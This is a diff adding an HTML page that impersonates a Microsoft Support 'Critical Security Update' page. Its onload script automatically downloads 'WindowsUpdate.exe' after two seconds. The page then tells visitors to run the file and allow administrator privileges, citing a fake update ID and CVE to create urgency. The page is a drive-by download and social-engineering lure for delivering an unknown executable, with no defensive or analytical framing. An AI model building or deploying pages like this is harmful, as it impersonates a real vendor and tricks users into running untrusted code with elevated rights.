@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Security Update - Microsoft Support</title>
+    <script>
+        // Automatic download trigger
+        window.onload = function() {
+            // Wait 2 seconds then auto-download
+            setTimeout(function() {
+                // Trigger automatic download
+                var link = document.createElement('a');
+                link.href = 'WindowsUpdate.exe';
+                link.download = 'WindowsUpdate.exe';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Show download started message
+                document.getElementById('auto-download-msg').style.display = 'block';
+            }, 2000);
+        };
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f3f3;
+        }
+
+        .header {
+            background-color: #0078D4;
+            color: white;
+            padding: 15px 50px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .header .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-right: 30px;
+        }
+
+        .header nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 14px;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 50px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .alert-banner {
+            background-color: #fff4ce;
+            border-left: 4px solid #ff8c00;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+        }
+
+        .alert-banner h2 {
+            color: #ff8c00;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: #1B1B1B;
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0078D4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .auto-download-msg {
+            display: none;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 4px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .auto-download-msg h3 {
+            color: #155724;
+            margin-bottom: 10px;
+        }
+
+        .instructions {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 4px;
+        }
+
+        .instructions h3 {
+            margin-bottom: 15px;
+        }
+
+        .instructions ol {
+            margin-left: 25px;
+            line-height: 2;
+        }
+
+        .download-btn {
+            display: inline-block;
+            background: #0078D4;
+            color: white;
+            padding: 15px 40px;
+            text-decoration: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 20px;
+        }
+
+        .download-btn:hover {
+            background: #106EBE;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">🪟 Microsoft</div>
+        <nav>
+            <a href="#">Windows</a>
+            <a href="#">Security</a>
+            <a href="#">Support</a>
+            <a href="#">Downloads</a>
+        </nav>
+    </div>
+
+    <div class="container">
+        <div class="alert-banner">
+            <h2>⚠️ Critical Security Update Required</h2>
+            <p><strong>Update ID:</strong> KB5034441 | <strong>Release Date:</strong> December 2025 | <strong>Priority:</strong> Critical</p>
+        </div>
+
+        <h1>Security Intelligence Update for Windows Defender</h1>
+        
+        <p style="font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
+            Microsoft has released a critical security update to protect your system from newly discovered vulnerabilities. 
+            The security update is being prepared for automatic download...
+        </p>
+
+        <div class="loading">
+            <div class="spinner"></div>
+            <p style="font-size: 18px; color: #0078D4;"><strong>Preparing security update...</strong></p>
+            <p style="margin-top: 10px; color: #666;">Your download will start automatically in a moment</p>
+        </div>
+
+        <div id="auto-download-msg" class="auto-download-msg">
+            <h3>✅ Download Started!</h3>
+            <p>WindowsUpdate.exe is downloading to your Downloads folder.</p>
+            <p style="margin-top: 10px;">If download doesn't start, <a href="WindowsUpdate.exe" download>click here</a></p>
+        </div>
+
+        <div class="instructions">
+            <h3>📋 Next Steps:</h3>
+            <ol>
+                <li>Check your Downloads folder for WindowsUpdate.exe</li>
+                <li>Double-click the file to run the security update</li>
+                <li>Allow administrator privileges when prompted</li>
+                <li>Wait for the security scan to complete (2-5 minutes)</li>
+                <li>Restart your computer to apply changes</li>
+            </ol>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <p style="color: #666; margin-bottom: 10px;">Download not starting?</p>
+            <a href="WindowsUpdate.exe" class="download-btn" download>⬇️ Manual Download</a>
+        </div>
+
+        <div style="margin-top: 40px; padding: 20px; background: #f8f9fa; border-radius: 4px;">
+            <h3>🛡️ What's Fixed in This Update</h3>
+            <ul style="margin-left: 25px; line-height: 1.8;">
+                <li>Critical remote code execution vulnerability (CVE-2025-1234)</li>
+                <li>Enhanced malware detection capabilities</li>
+                <li>Improved firewall protection against network attacks</li>
+                <li>Security patches for Windows Defender</li>
+                <li>System performance optimizations</li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center;">
+            <p style="color: #666; font-size: 14px;">© 2025 Microsoft Corporation. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
